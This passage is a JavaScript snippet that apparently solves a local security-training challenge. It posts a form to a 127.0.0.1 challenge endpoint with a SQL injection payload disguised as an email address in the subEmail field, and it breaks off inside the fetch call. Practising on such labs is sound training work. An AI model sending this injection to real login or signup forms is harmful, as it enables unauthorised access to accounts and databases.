const url = "https://127.0.0.1:8444/challenges/8c2dd7e9818e5c6a9f8562feefa002dc0e455f0e92c8a46ab0cf519b1547eced";

const data = new URLSearchParams();

data.set("subEmail", `"x' OR 1=1 OR 'a'='b"@x.x`);
data.set("subPassword", "test");

fetch(url, {
  headers: {
    "accept": "*/*",
    "content-type": "application/x-www-form-urlencoded",
    "x-requested-with": "XMLHttpRequest"
  },
  referrer: "https://127.0.0.1:8444/challenges/8c2dd7e9818e5c6a9f8562feefa002dc0e455f0e92c8a46ab0cf519b1547eced.jsp",
  body: data.toString(),
